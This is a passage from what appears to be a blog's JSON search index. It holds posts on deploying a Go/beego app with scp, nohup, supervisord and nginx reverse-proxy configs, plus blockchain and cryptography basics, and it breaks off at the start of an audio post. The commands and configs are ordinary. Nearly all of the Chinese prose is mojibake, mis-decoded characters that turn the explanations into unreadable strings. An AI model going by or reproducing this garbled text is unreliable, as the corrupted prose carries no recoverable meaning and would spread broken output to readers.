-C -r /Users/liuwei/golang/src/web ubuntu@ec2-54-191-9-26.us-west-2.compute.amazonaws.com:/home/ubuntu\n```\n\naws.pem chmod 400\n\nscp  -C åŠ ä¸€ä¸ªå¯èƒ½ä¼šæ›´å¿«\n\n### å‘è¡Œéƒ¨ç½²\n\nGo è¯­è¨€çš„åº”ç”¨æœ€åç¼–è¯‘ä¹‹åæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½ åªéœ€è¦ copy è¿™ä¸ªåº”ç”¨åˆ°æœåŠ¡å™¨ä¸Šï¼Œè¿è¡Œèµ·æ¥å°±è¡Œã€‚beego ç”±äºå¸¦æœ‰å‡ ä¸ªé™æ€æ–‡ä»¶ã€é…ç½®æ–‡ä»¶ã€æ¨¡æ¿æ–‡ä»¶ä¸‰ä¸ªç›®å½•ï¼Œæ‰€ä»¥ç”¨æˆ·éƒ¨ç½²çš„æ—¶å€™éœ€è¦åŒæ—¶ copy è¿™ä¸‰ä¸ªç›®å½•åˆ°ç›¸åº”çš„éƒ¨ç½²åº”ç”¨ä¹‹ä¸‹ï¼Œä¸‹é¢ä»¥æˆ‘å®é™…çš„åº”ç”¨éƒ¨ç½²ä¸ºä¾‹ï¼š\n\n<!-- more -->\n```\n$ mkdir /opt/app/beepkg\n$ cp beepkg /opt/app/beepkg\n$ cp -fr views /opt/app/beepkg\n$ cp -fr static /opt/app/beepkg\n$ cp -fr conf /opt/app/beepkg\n\n```\nè¿™æ ·åœ¨ /opt/app/beepkg ç›®å½•ä¸‹é¢å°±ä¼šæ˜¾ç¤ºå¦‚ä¸‹çš„ç›®å½•ç»“æ„ï¼š\n\n```\n.\nâ”œâ”€â”€ conf\nâ”‚   â”œâ”€â”€ app.conf\nâ”œâ”€â”€ static\nâ”‚   â”œâ”€â”€ css\nâ”‚   â”œâ”€â”€ img\nâ”‚   â””â”€â”€ js\nâ””â”€â”€ views\n    â””â”€â”€ index.tpl\nâ”œâ”€â”€ beepkg\n\n```\nè¿™æ ·æˆ‘ä»¬å°±å·²ç»æŠŠæˆ‘ä»¬éœ€è¦çš„åº”ç”¨æ¬åˆ°æœåŠ¡å™¨äº†ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±å¯ä»¥å¼€å§‹éƒ¨ç½²äº†ã€‚\n\nå°±æ˜¯ä¸€å…±ä¸Šä¼ 3ä¸ªæ–‡ä»¶å¤¹å’Œ1ä¸ªå¯æ‰§è¡Œæ–‡ä»¶\n\n### 1. ç‹¬ç«‹éƒ¨ç½²\nåœ¨ linux ä¸‹é¢éƒ¨ç½²ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ nohup å‘½ä»¤ï¼ŒæŠŠåº”ç”¨éƒ¨ç½²åœ¨åç«¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n\n```\nnohup ./beepkg &\n```\nè¿™æ ·ä½ çš„åº”ç”¨å°±è·‘åœ¨äº† Linux ç³»ç»Ÿçš„å®ˆæŠ¤è¿›ç¨‹\n\n\n\n### 2. supervisord ç®¡ç†\nsupervisord æ˜¯ç”¨ Python å®ç°çš„ä¸€æ¬¾éå¸¸å®ç”¨çš„è¿›ç¨‹ç®¡ç†å·¥å…·ï¼Œsupervisord è¿˜è¦æ±‚ç®¡ç†çš„ç¨‹åºæ˜¯é daemon ç¨‹åºï¼Œsupervisord ä¼šå¸®ä½ æŠŠå®ƒè½¬æˆ daemon ç¨‹åºï¼Œå› æ­¤å¦‚æœç”¨ supervisord æ¥ç®¡ç† nginx çš„è¯ï¼Œå¿…é¡»åœ¨ nginx çš„é…ç½®æ–‡ä»¶é‡Œæ·»åŠ ä¸€è¡Œè®¾ç½® daemon off è®© nginx ä»¥é daemon æ–¹å¼å¯åŠ¨ã€‚\n\n1. å®‰è£… setuptools\n\n```\nwget http://pypi.python.org/packages/2.7/s/setuptools/setuptools-0.6c11-py2.7.egg\nsh setuptools-0.6c11-py2.7.egg\neasy_install supervisor\necho_supervisord_conf >/etc/supervisord.conf\nmkdir /etc/supervisord.conf.d\n```\n\n2. ä¿®æ”¹é…ç½® /etc/supervisord.conf\n\n```\n[include]\nfiles = /etc/supervisord.conf.d/*.conf\n```\n\n3. æ–°å»ºç®¡ç†çš„åº”ç”¨\ncd /etc/supervisord.conf.d\nvim beepkg.conf\né…ç½®æ–‡ä»¶ï¼š\n\n```\n[program:beepkg]\ndirectory = /opt/app/beepkg\ncommand = /opt/app/beepkg/beepkg\nautostart = true\nstartsecs = 5\nuser = root\nredirect_stderr = true\nstdout_logfile = /var/log/supervisord/beepkg.log\n```\n\n##### supervisord ç®¡ç†\n\nsupervisord å®‰è£…å®Œæˆåæœ‰ä¸¤ä¸ªå¯ç”¨çš„å‘½ä»¤è¡Œ supervisord å’Œ supervisorctlï¼Œå‘½ä»¤ä½¿ç”¨è§£é‡Šå¦‚ä¸‹ï¼š\n\n  â— supervisordï¼Œåˆå§‹å¯åŠ¨ Supervisordï¼Œå¯åŠ¨ã€ç®¡ç†é…ç½®ä¸­è®¾ç½®çš„è¿›ç¨‹ã€‚\n\n  â— supervisorctl stop programxxxï¼Œåœæ­¢æŸä¸€ä¸ªè¿›ç¨‹(programxxx)ï¼Œprogramxxx ä¸º [program:beepkg] é‡Œé…ç½®çš„å€¼ï¼Œè¿™ä¸ªç¤ºä¾‹å°±æ˜¯ beepkgã€‚\n\n  â— supervisorctl start programxxxï¼Œå¯åŠ¨æŸä¸ªè¿›ç¨‹\n\n  â— supervisorctl restart programxxxï¼Œé‡å¯æŸä¸ªè¿›ç¨‹\n\n  â— supervisorctl stop groupworker: ï¼Œé‡å¯æ‰€æœ‰å±äºåä¸º groupworker è¿™ä¸ªåˆ†ç»„çš„è¿›ç¨‹(start,restart åŒç†)\n\n  â— supervisorctl stop allï¼Œåœæ­¢å…¨éƒ¨è¿›ç¨‹ï¼Œæ³¨ï¼šstartã€restartã€stop éƒ½ä¸ä¼šè½½å…¥æœ€æ–°çš„é…ç½®æ–‡ä»¶ã€‚\n\n  â— supervisorctl reloadï¼Œè½½å…¥æœ€æ–°çš„é…ç½®æ–‡ä»¶ï¼Œåœæ­¢åŸæœ‰è¿›ç¨‹å¹¶æŒ‰æ–°çš„é…ç½®å¯åŠ¨ã€ç®¡ç†æ‰€æœ‰è¿›ç¨‹ã€‚\n\n  â— supervisorctl updateï¼Œæ ¹æ®æœ€æ–°çš„é…ç½®æ–‡ä»¶ï¼Œå¯åŠ¨æ–°é…ç½®æˆ–æœ‰æ”¹åŠ¨çš„è¿›ç¨‹ï¼Œé…ç½®æ²¡æœ‰æ”¹åŠ¨çš„è¿›ç¨‹ä¸ä¼šå—å½±å“è€Œé‡å¯ã€‚\n\næ³¨æ„ï¼šæ˜¾ç¤ºç”¨ stop åœæ­¢æ‰çš„è¿›ç¨‹ï¼Œç”¨ reload æˆ–è€… update éƒ½ä¸ä¼šè‡ªåŠ¨é‡å¯ã€‚\n\n\n> è‡ªå·±çš„é…ç½®\n\n```\nweb.conf\n\n[program:web]\ndirectory = /home/ubuntu/web\ncommand = /home/ubuntu/web/web\nautostart = true\nstartsecs = 5\nuser = root\nredirect_stderr = true\nstdout_logfile = /var/log/supervisord/web.log\n```\n\nsudo supervisord //å¯åŠ¨\nsudo supervisorctl stop web //ç»“æŸ\n\n\n\n### 3. nginxéƒ¨ç½²\n\n1 å®‰è£…nginx \n\n```\nsudo apt-get install nginx\n```\n\nUbuntuå®‰è£…ä¹‹åçš„æ–‡ä»¶ç»“æ„å¤§è‡´ä¸ºï¼š\n\n  â— æ‰€æœ‰çš„é…ç½®æ–‡ä»¶éƒ½åœ¨/etc/nginxä¸‹ï¼Œå¹¶ä¸”æ¯ä¸ªè™šæ‹Ÿä¸»æœºå·²ç»å®‰æ’åœ¨äº†/etc/nginx/sites-availableä¸‹\n\n  â— ç¨‹åºæ–‡ä»¶åœ¨/usr/sbin/nginx\n\n  â— æ—¥å¿—æ”¾åœ¨äº†/var/log/nginxä¸­\n\n  â— å¹¶å·²ç»åœ¨/etc/init.d/ä¸‹åˆ›å»ºäº†å¯åŠ¨è„šæœ¬nginx\n\n  â— é»˜è®¤çš„è™šæ‹Ÿä¸»æœºçš„ç›®å½•è®¾ç½®åœ¨äº†/var/www/nginx-default (æœ‰çš„ç‰ˆæœ¬ é»˜è®¤çš„è™šæ‹Ÿä¸»æœºçš„ç›®å½•è®¾ç½®åœ¨äº†/var/www, è¯·å‚è€ƒ/etc/nginx/sites-availableé‡Œçš„é…ç½®)\n\n2 å¯åŠ¨nginx\n\n```\nsudo /etc/init.d/nginx start\n```\nç›´æ¥è®¿é—®ip http://54.191.9.26/ å¯ä»¥çœ‹åˆ°nginxå®‰è£…æˆåŠŸ\n\n\n3 å¤„ç†golang\n\nGo æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ HTTP æœåŠ¡å™¨ï¼Œä½†æ˜¯æˆ‘ä»¬æœ‰äº›æ—¶å€™ä¸ºäº† nginx å¯ä»¥å¸®æˆ‘åšå¾ˆå¤šå·¥ä½œï¼Œä¾‹å¦‚è®¿é—®æ—¥å¿—ï¼Œcc æ”»å‡»ï¼Œé™æ€æœåŠ¡ç­‰ï¼Œnginx å·²ç»åšçš„å¾ˆæˆç†Ÿäº†ï¼ŒGo åªè¦ä¸“æ³¨äºä¸šåŠ¡é€»è¾‘å’ŒåŠŸèƒ½å°±å¥½ï¼Œæ‰€ä»¥é€šè¿‡ nginx é…ç½®ä»£ç†å°±å¯ä»¥å®ç°å¤šåº”ç”¨åŒæ—¶éƒ¨ç½²ï¼Œå¦‚ä¸‹å°±æ˜¯å…¸å‹çš„ä¸¤ä¸ªåº”ç”¨å…±äº« 80 ç«¯å£ï¼Œé€šè¿‡ä¸åŒçš„åŸŸåè®¿é—®ï¼Œåå‘ä»£ç†åˆ°ä¸åŒçš„åº”ç”¨ã€‚\n\n```\nserver {\n    listen       80;\n    server_name  .a.com;\n\n    charset utf-8;\n    access_log  /home/a.com.access.log;\n\n    location /(css|js|fonts|img)/ {\n        access_log off;\n        expires 1d;\n\n        root \"/path/to/app_a/static\";\n        try_files $uri @backend;\n    }\n\n    location / {\n        try_files /_not_exists_ @backend;\n    }\n\n    location @backend {\n        proxy_set_header X-Forwarded-For $remote_addr;\n        proxy_set_header Host            $http_host;\n\n        proxy_pass http://127.0.0.1:8080;\n    }\n}\n\nserver {\n    listen       80;\n    server_name  .b.com;\n\n    charset utf-8;\n    access_log  /home/b.com.access.log  main;\n\n    location /(css|js|fonts|img)/ {\n        access_log off;\n        expires 1d;\n\n        root \"/path/to/app_b/static\";\n        try_files $uri @backend;\n    }\n\n    location / {\n        try_files /_not_exists_ @backend;\n    }\n\n    location @backend {\n        proxy_set_header X-Forwarded-For $remote_addr;\n        proxy_set_header Host            $http_host;\n\n        proxy_pass http://127.0.0.1:8081;\n    }\n}\n```\n\n> è‡ªå·±çš„é…ç½®\n\nsudo vi /etc/nginx/sites-available/default\n\næŠŠ default æ³¨é‡Šæ‰\n\n```\nserver {\n        listen       80;\n        server_name  .xuanyueting.top;\n\n        charset utf-8;\n        access_log  /home/ubuntu/web/xuanyueting.log;\n\n        location /(css|js|fonts|img)/ {\n                access_log off;\n                expires 1d;\n\n                root \"/home/ubuntu/web/static\";\n                try_files $uri @backend;\n        }\n        location / {\n                try_files /_not_exists_ @backend;\n        }\n\n        location @backend {\n                proxy_set_header x-forwarded-for $remote_addr;\n                proxy_set_header host            $http_host;\n\n                proxy_pass http://127.0.0.1:8080;\n        }\n}\n```\n\n\n","tags":["golang"],"categories":["3_golangæ‚é¡¹"]},{"title":"åŒºå—é“¾åŸºç¡€","url":"%2Fp%2Feb2c6f22.html","content":"\n# åŒºå—é“¾\n\nåŒºå—é“¾å±äºä¸€ç§å»ä¸­å¿ƒåŒ–çš„è®°å½•æŠ€æœ¯ã€‚å‚ä¸åˆ°ç³»ç»Ÿä¸Šçš„èŠ‚ç‚¹ï¼Œå¯èƒ½ä¸å±äºåŒä¸€ç»„ç»‡ã€å½¼æ­¤æ— éœ€ä¿¡ä»»ï¼›åŒºå—é“¾æ•°æ®ç”±æ‰€æœ‰èŠ‚ç‚¹å…±åŒç»´æŠ¤ï¼Œæ¯ä¸ªå‚ä¸ç»´æŠ¤èŠ‚ç‚¹éƒ½èƒ½å¤åˆ¶è·å¾—ä¸€ä»½å®Œæ•´è®°å½•çš„æ‹·è´ã€‚\n\n### ç‰¹ç‚¹\nè·Ÿä¼ ç»Ÿçš„è®°è´¦æŠ€æœ¯ç›¸æ¯”ï¼Œå…¶ç‰¹ç‚¹åº”è¯¥åŒ…æ‹¬ï¼š\n\n* ç»´æŠ¤ä¸€æ¡ä¸æ–­å¢é•¿çš„é“¾ï¼Œåªå¯èƒ½æ·»åŠ è®°å½•ï¼Œè€Œå‘ç”Ÿè¿‡çš„è®°å½•éƒ½ä¸å¯ç¯¡æ”¹ï¼›\n* å»ä¸­å¿ƒåŒ–ï¼Œæˆ–è€…è¯´å¤šä¸­å¿ƒåŒ–ï¼Œæ— éœ€é›†ä¸­çš„æ§åˆ¶è€Œèƒ½è¾¾æˆå…±è¯†ï¼Œå®ç°ä¸Šå°½é‡åˆ†å¸ƒå¼ï¼›\n* é€šè¿‡å¯†ç å­¦çš„æœºåˆ¶æ¥ç¡®ä¿äº¤æ˜“æ— æ³•æŠµèµ–å’Œç ´åï¼Œå¹¶å°½é‡ä¿æŠ¤ç”¨æˆ·ä¿¡æ¯å’Œè®°å½•çš„éšç§æ€§ã€‚\n\n\n### åŸºæœ¬åŸç†\nåŒºå—é“¾çš„åŸºæœ¬åŸç†ç†è§£èµ·æ¥å¹¶ä¸éš¾ã€‚åŸºæœ¬æ¦‚å¿µåŒ…æ‹¬ï¼š\n\n* äº¤æ˜“ï¼ˆTransactionï¼‰ï¼šä¸€æ¬¡æ“ä½œï¼Œå¯¼è‡´è´¦æœ¬çŠ¶æ€çš„ä¸€æ¬¡æ”¹å˜ï¼Œå¦‚æ·»åŠ ä¸€æ¡è®°å½•ï¼›\n* åŒºå—ï¼ˆBlockï¼‰ï¼šè®°å½•ä¸€æ®µæ—¶é—´å†…å‘ç”Ÿçš„äº¤æ˜“å’ŒçŠ¶æ€ç»“æœï¼Œæ˜¯å¯¹å½“å‰è´¦æœ¬çŠ¶æ€çš„ä¸€æ¬¡å…±è¯†ï¼›\n* é“¾ï¼ˆChainï¼‰ï¼šç”±ä¸€ä¸ªä¸ªåŒºå—æŒ‰ç…§å‘ç”Ÿé¡ºåºä¸²è”è€Œæˆï¼Œæ˜¯æ•´ä¸ªçŠ¶æ€å˜åŒ–çš„æ—¥å¿—è®°å½•ã€‚\n<!-- more -->\n\n### åˆ†ç±»\næ ¹æ®å‚ä¸è€…çš„ä¸åŒï¼Œå¯ä»¥åˆ†ä¸ºå…¬å¼€ï¼ˆPublicï¼‰é“¾ã€è”ç›Ÿï¼ˆConsortiumï¼‰é“¾å’Œç§æœ‰ï¼ˆPrivateï¼‰é“¾ã€‚\nç›®å‰æ¥çœ‹ï¼Œå…¬å¼€é“¾å°†ä¼šæ›´å¤šçš„å¸å¼•ç¤¾åŒºå’Œåª’ä½“çš„çœ¼çƒï¼Œä½†æ›´å¤šçš„å•†ä¸šä»·å€¼åº”è¯¥åœ¨è”ç›Ÿé“¾å’Œç§æœ‰é“¾ä¸Šã€‚\n\næ ¹æ®ä½¿ç”¨ç›®çš„å’Œåœºæ™¯çš„ä¸åŒï¼Œåˆå¯ä»¥åˆ†ä¸ºä»¥æ•°å­—è´§å¸ä¸ºç›®çš„çš„è´§å¸é“¾ï¼Œä»¥è®°å½•äº§æƒä¸ºç›®çš„çš„äº§æƒé“¾ï¼Œä»¥ä¼—ç­¹ä¸ºç›®çš„çš„ä¼—ç­¹é“¾ç­‰ã€‚\n\n### å­˜å‚¨\né¦–å…ˆï¼ŒåŒºå—é“¾ä¸æ˜¯æ•°æ®åº“ã€‚è™½ç„¶åŒºå—é“¾ä¹Ÿå¯ä»¥ç”¨æ¥å­˜å‚¨æ•°æ®ï¼Œä½†å®ƒè¦è§£å†³çš„é—®é¢˜æ˜¯å¤šæ–¹çš„äº’ä¿¡é—®é¢˜ã€‚å•çº¯ä»å­˜å‚¨æ•°æ®è§’åº¦ï¼Œå®ƒçš„æ•ˆç‡å¯èƒ½ä¸é«˜ï¼Œç¬”è€…ä¹Ÿä¸æ¨èæŠŠå¤§é‡çš„åŸå§‹æ•°æ®æ”¾åˆ°åŒºå—é“¾ä¸Šã€‚\n\n### è®¡ç®—\nåŒºå—é“¾æŠ€æœ¯è¿˜èƒ½å¸¦æ¥æ›´é€šç”¨çš„è®¡ç®—èƒ½åŠ›ã€‚Hyperledger å’Œ Ethereum å°±è¯•å›¾åšç±»ä¼¼çš„äº‹æƒ…ï¼ŒåŸºäºåŒºå—é“¾å†åšä¸€å±‚å¹³å°å±‚ï¼Œè®©åˆ«äººåŸºäºå¹³å°å¼€å‘åº”ç”¨å˜å¾—æ›´ç®€å•ã€‚\n\n\n\n\n# åˆ†å¸ƒå¼é—®é¢˜\n\n### ä¸€è‡´æ€§\n\nç†æƒ³çš„åˆ†å¸ƒå¼ç³»ç»Ÿä¸€è‡´æ€§åº”è¯¥æ»¡è¶³ï¼š\n\n* å¯ç»ˆæ­¢æ€§ï¼ˆTerminationï¼‰ï¼šä¸€è‡´çš„ç»“æœåœ¨æœ‰é™æ—¶é—´å†…èƒ½å®Œæˆï¼›\n* å…±è¯†æ€§ï¼ˆConsensusï¼‰ï¼šä¸åŒèŠ‚ç‚¹æœ€ç»ˆå®Œæˆå†³ç­–çš„ç»“æœåº”è¯¥ç›¸åŒï¼›\n* åˆæ³•æ€§ï¼ˆValidityï¼‰ï¼šå†³ç­–çš„ç»“æœå¿…é¡»æ˜¯å…¶å®ƒè¿›ç¨‹æå‡ºçš„ææ¡ˆã€‚\n\n\nå®é™…ä¸Šï¼Œè¶Šå¼ºçš„ä¸€è‡´æ€§è¦æ±‚å¾€å¾€æ„å‘³ç€è¶Šå¼±çš„æ€§èƒ½ã€‚\n\n\n### FLP ä¸å¯èƒ½æ€§åŸç†\n\nFLP ä¸å¯èƒ½åŸç†ï¼šåœ¨ç½‘ç»œå¯é ï¼Œå­˜åœ¨èŠ‚ç‚¹å¤±æ•ˆï¼ˆå³ä¾¿åªæœ‰ä¸€ä¸ªï¼‰çš„æœ€å°åŒ–å¼‚æ­¥æ¨¡å‹ç³»ç»Ÿä¸­ï¼Œä¸å­˜åœ¨ä¸€ä¸ªå¯ä»¥è§£å†³ä¸€è‡´æ€§é—®é¢˜çš„ç¡®å®šæ€§ç®—æ³•ã€‚\n\nFLP ä¸å¯èƒ½åŸç†å®é™…ä¸Šå‘Šè¯‰äººä»¬ï¼Œä¸è¦æµªè´¹æ—¶é—´å»ä¸ºå¼‚æ­¥åˆ†å¸ƒå¼ç³»ç»Ÿè®¾è®¡åœ¨ä»»æ„åœºæ™¯ä¸‹éƒ½èƒ½å®ç°å…±è¯†çš„ç®—æ³•ã€‚\n\n\n### CAP åŸç†\n\n* ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰ï¼šä»»ä½•æ“ä½œåº”è¯¥éƒ½æ˜¯åŸå­çš„ï¼Œå‘ç”Ÿåœ¨åé¢çš„äº‹ä»¶èƒ½çœ‹åˆ°å‰é¢äº‹ä»¶å‘ç”Ÿå¯¼è‡´çš„ç»“æœï¼Œæ³¨æ„è¿™é‡ŒæŒ‡çš„æ˜¯å¼ºä¸€è‡´æ€§ï¼›\n* å¯ç”¨æ€§ï¼ˆAvailablityï¼‰ï¼šåœ¨æœ‰é™æ—¶é—´å†…ï¼Œä»»ä½•éå¤±è´¥èŠ‚ç‚¹éƒ½èƒ½åº”ç­”è¯·æ±‚ï¼›\n* åˆ†åŒºå®¹å¿æ€§ï¼ˆPartitionï¼‰ï¼šç½‘ç»œå¯èƒ½å‘ç”Ÿåˆ†åŒºï¼Œå³èŠ‚ç‚¹ä¹‹é—´çš„é€šä¿¡ä¸å¯ä¿éšœã€‚\n\n1. å¼±åŒ–ä¸€è‡´æ€§  å¯¹ç»“æœä¸€è‡´æ€§ä¸æ•æ„Ÿçš„åº”ç”¨ï¼Œå¯ä»¥å…è®¸åœ¨æ–°ç‰ˆæœ¬ä¸Šçº¿åè¿‡ä¸€æ®µæ—¶é—´æ‰æ›´æ–°æˆåŠŸï¼ŒæœŸé—´ä¸ä¿è¯ä¸€è‡´æ€§ã€‚\n\n2. å¼±åŒ–å¯ç”¨æ€§  å¯¹ç»“æœä¸€è‡´æ€§å¾ˆæ•æ„Ÿçš„åº”ç”¨ï¼Œä¾‹å¦‚é“¶è¡Œå–æ¬¾æœºï¼Œå½“ç³»ç»Ÿæ•…éšœæ—¶å€™ä¼šæ‹’ç»æœåŠ¡ã€‚MongoDBã€Redis ç­‰ä¸ºæ­¤è®¾è®¡ã€‚Paxosã€Raft ç­‰ç®—æ³•ï¼Œä¸»è¦å¤„ç†è¿™ç§æƒ…å†µã€‚\n\n3. å¼±åŒ–åˆ†åŒºå®¹å¿æ€§  ç°å®ä¸­ï¼Œç½‘ç»œåˆ†åŒºå‡ºç°æ¦‚ç‡å‡å°ï¼Œä½†è¾ƒéš¾é¿å…ã€‚æŸäº›å…³ç³»å‹æ•°æ®åº“ã€ZooKeeper å³ä¸ºæ­¤è®¾è®¡ã€‚\n\n\n### ACID åŸåˆ™\n\n\nå³ Atomicityï¼ˆåŸå­æ€§ï¼‰ã€Consistencyï¼ˆä¸€è‡´æ€§ï¼‰ã€Isolationï¼ˆéš”ç¦»æ€§ï¼‰ã€Durabilityï¼ˆæŒä¹…æ€§ï¼‰ã€‚\n\nACID åŸåˆ™æè¿°äº†å¯¹åˆ†å¸ƒå¼æ•°æ®åº“çš„ä¸€è‡´æ€§éœ€æ±‚ï¼ŒåŒæ—¶ä»˜å‡ºäº†å¯ç”¨æ€§çš„ä»£ä»·ã€‚\n\n* Atomicityï¼šæ¯æ¬¡æ“ä½œæ˜¯åŸå­çš„ï¼Œè¦ä¹ˆæˆåŠŸï¼Œè¦ä¹ˆä¸æ‰§è¡Œï¼›\n* Consistencyï¼šæ•°æ®åº“çš„çŠ¶æ€æ˜¯ä¸€è‡´çš„ï¼Œæ— ä¸­é—´çŠ¶æ€ï¼›\n* Isolationï¼šå„ç§æ“ä½œå½¼æ­¤äº’ç›¸ä¸å½±å“ï¼›\n* Durabilityï¼šçŠ¶æ€çš„æ”¹å˜æ˜¯æŒä¹…çš„ï¼Œä¸ä¼šå¤±æ•ˆã€‚\n\nä¸€ä¸ªä¸ä¹‹ç›¸å¯¹çš„åŸåˆ™æ˜¯ BASEï¼ˆBasic Availiabilityï¼ŒSoft stateï¼ŒEventually Consistencyï¼‰ï¼Œç‰ºç‰²æ‰å¯¹ä¸€è‡´æ€§çš„çº¦æŸï¼ˆæœ€ç»ˆä¸€è‡´æ€§ï¼‰ï¼Œæ¥æ¢å–ä¸€å®šçš„å¯ç”¨æ€§ã€‚\n\n\n# å¯†ç å­¦\n\n\n### hash\n\nä¸€ä¸ªä¼˜ç§€çš„ hash ç®—æ³•ï¼Œå°†èƒ½å®ç°ï¼š\n\n* æ­£å‘å¿«é€Ÿï¼šç»™å®šæ˜æ–‡å’Œ hash ç®—æ³•ï¼Œåœ¨æœ‰é™æ—¶é—´å’Œæœ‰é™èµ„æºå†…èƒ½è®¡ç®—å‡º hash å€¼ã€‚\n* é€†å‘å›°éš¾ï¼šç»™å®šï¼ˆè‹¥å¹²ï¼‰ hash å€¼ï¼Œåœ¨æœ‰é™æ—¶é—´å†…å¾ˆéš¾ï¼ˆåŸºæœ¬ä¸å¯èƒ½ï¼‰é€†æ¨å‡ºæ˜æ–‡ã€‚\n* è¾“å…¥æ•æ„Ÿï¼šåŸå§‹è¾“å…¥ä¿¡æ¯ä¿®æ”¹ä¸€ç‚¹ä¿¡æ¯ï¼Œäº§ç”Ÿçš„ hash å€¼çœ‹èµ·æ¥åº”è¯¥éƒ½æœ‰å¾ˆå¤§ä¸åŒã€‚\n* å†²çªé¿å…ï¼šå¾ˆéš¾æ‰¾åˆ°ä¸¤æ®µå†…å®¹ä¸åŒçš„æ˜æ–‡ï¼Œä½¿å¾—å®ƒä»¬çš„ hash å€¼ä¸€è‡´ï¼ˆå‘ç”Ÿå†²çªï¼‰\n\n\n\n### åŠ è§£å¯†\n\næ ¹æ®åŠ è§£å¯†çš„å¯†é’¥æ˜¯å¦ç›¸åŒï¼Œç®—æ³•å¯ä»¥åˆ†ä¸ºå¯¹ç§°åŠ å¯†ï¼ˆsymmetric cryptographyï¼Œåˆç§°å…¬å…±å¯†é’¥åŠ å¯†ï¼Œcommon-key cryptographyï¼‰å’Œéå¯¹ç§°åŠ å¯†(asymmetric cryptographyï¼Œåˆç§°å…¬é’¥åŠ å¯†ï¼Œpublic-key cryptography)ã€‚ä¸¤ç§æ¨¡å¼é€‚ç”¨äºä¸åŒçš„éœ€æ±‚ï¼Œæ°å¥½å½¢æˆäº’è¡¥ï¼Œå¾ˆå¤šæ—¶å€™ä¹Ÿå¯ä»¥ç»„åˆä½¿ç”¨ï¼Œå½¢æˆæ··åˆåŠ å¯†æœºåˆ¶ã€‚\n\n\n* å¯¹ç§°åŠ å¯†\n\nä¼˜ç‚¹æ˜¯åŠ è§£å¯†æ•ˆç‡é«˜ï¼ˆé€Ÿåº¦å¿«ï¼Œç©ºé—´å ç”¨å°ï¼‰ï¼ŒåŠ å¯†å¼ºåº¦é«˜ã€‚\n\nç¼ºç‚¹æ˜¯å‚ä¸å¤šæ–¹éƒ½éœ€è¦æŒæœ‰å¯†é’¥ï¼Œä¸€æ—¦æœ‰äººæ³„éœ²åˆ™å®‰å…¨æ€§è¢«ç ´åï¼›å¦å¤–å¦‚ä½•åœ¨ä¸å®‰å…¨é€šé“ä¸‹åˆ†å‘å¯†é’¥ä¹Ÿæ˜¯ä¸ªé—®é¢˜ã€‚\n\né€‚ç”¨äºå¤§é‡æ•°æ®çš„åŠ è§£å¯†ï¼›ä¸èƒ½ç”¨äºç­¾ååœºæ™¯ï¼›éœ€è¦æå‰åˆ†å‘å¯†é’¥ã€‚\n\n* éå¯¹ç§°åŠ å¯†\n\néå¯¹ç§°åŠ å¯†æ˜¯ç°ä»£å¯†ç å­¦å†å²ä¸Šæœ€ä¸ºä¼Ÿå¤§çš„å‘æ˜ï¼Œå¯ä»¥å¾ˆå¥½çš„è§£å†³å¯¹ç§°åŠ å¯†éœ€è¦çš„æå‰åˆ†å‘å¯†é’¥é—®é¢˜ã€‚\n\né¡¾åæ€ä¹‰ï¼ŒåŠ å¯†å¯†é’¥å’Œè§£å¯†å¯†é’¥æ˜¯ä¸åŒçš„ï¼Œåˆ†åˆ«ç§°ä¸ºå…¬é’¥å’Œç§é’¥ã€‚\nå…¬é’¥ä¸€èˆ¬æ˜¯å…¬å¼€çš„ï¼Œäººäººå¯è·å–çš„ï¼Œç§é’¥ä¸€èˆ¬æ˜¯ä¸ªäººè‡ªå·±æŒæœ‰ï¼Œä¸èƒ½è¢«ä»–äººè·å–ã€‚\nä¼˜ç‚¹æ˜¯å…¬ç§é’¥åˆ†å¼€ï¼Œä¸å®‰å…¨é€šé“ä¹Ÿå¯ä½¿ç”¨ã€‚\nç¼ºç‚¹æ˜¯åŠ è§£å¯†é€Ÿåº¦æ…¢ï¼Œä¸€èˆ¬æ¯”å¯¹ç§°åŠ è§£å¯†ç®—æ³•æ…¢ä¸¤åˆ°ä¸‰ä¸ªæ•°é‡çº§ï¼›åŒæ—¶åŠ å¯†å¼ºåº¦ç›¸æ¯”å¯¹ç§°åŠ å¯†è¦å·®ã€‚\n\nä¸€èˆ¬é€‚ç”¨äºç­¾ååœºæ™¯æˆ–å¯†é’¥åå•†ï¼Œä¸é€‚äºå¤§é‡æ•°æ®çš„åŠ è§£å¯†ã€‚\n\n* æ··åˆåŠ å¯†æœºåˆ¶\n\nå³å…ˆç”¨è®¡ç®—å¤æ‚åº¦é«˜çš„éå¯¹ç§°åŠ å¯†åå•†ä¸€ä¸ªä¸´æ—¶çš„å¯¹ç§°åŠ å¯†å¯†é’¥ï¼ˆä¼šè¯å¯†é’¥ï¼Œä¸€èˆ¬ç›¸å¯¹å†…å®¹æ¥è¯´è¦çŸ­çš„å¤šï¼‰ï¼Œç„¶ååŒæ–¹å†é€šè¿‡å¯¹ç§°åŠ å¯†å¯¹ä¼ é€’çš„å¤§é‡æ•°æ®è¿›è¡ŒåŠ è§£å¯†å¤„ç†ã€‚\n\nå…¸å‹çš„åœºæ™¯æ˜¯ç°åœ¨å¤§å®¶å¸¸ç”¨çš„ HTTPS æœºåˆ¶ã€‚\n\n\n\n","tags":["åŒºå—é“¾"],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"éŸ³é¢‘åŸºç¡€","url":"%2Fp%2F279c3cd4.html","content":"\n\n### éŸ³é¢‘åŸºç¡€\n\nå½“å‰ï¼Œæˆ‘ä»¬æ‰€è¯´çš„éŸ³é¢‘ï¼Œéƒ½æ˜¯æ•°å­—éŸ³é¢‘ã€‚æ•°å­—éŸ³é¢‘ç”±é‡‡æ ·é¢‘ç‡ã€é‡‡æ ·ç²¾åº¦ã€å£°éŸ³é€šé“æ•°ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆã€‚\n\né‡‡æ ·é¢‘ç‡ï¼šæ—¢é‡‡æ ·ç‡ï¼ŒæŒ‡è®°å½•å£°éŸ³æ—¶æ¯ç§’çš„é‡‡æ ·ä¸ªæ•°ï¼Œå®ƒç”¨èµ«å…¹(Hz)æ¥è¡¨ç¤ºã€‚\né‡‡æ 